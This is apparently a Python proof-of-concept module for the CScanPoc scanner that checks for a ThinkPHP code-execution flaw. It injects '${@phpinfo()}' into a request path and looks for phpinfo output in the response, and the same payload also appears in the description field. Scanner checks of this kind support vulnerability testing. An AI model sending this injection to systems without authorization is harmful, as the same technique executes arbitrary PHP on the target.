# coding:utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ThinkPHP_0101'  # 平台漏洞编号
    name = 'ThinkPHP框架代码执行'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    ThinkPHP框架代码执行
    url = self.target + "/index.php/module/aciton/param1/${@phpinfo()}"
    try:
        r = requests.get(url, timeout=5)
    except Exception:
        pass
    else:
        r.close()
        if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
    '''  # 漏洞描述
    ref = 'https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/thinkphp/thinkphpCodeEXE.py'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkPHP'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '838ccfaf-c942-4b5f-a111-fe7aaf54f650'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/index.php/module/aciton/param1/${@phpinfo()}"
            try:
                r = requests.get(url, timeout=5)
            except Exception:
                pass
            else:
                r.close()
                if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
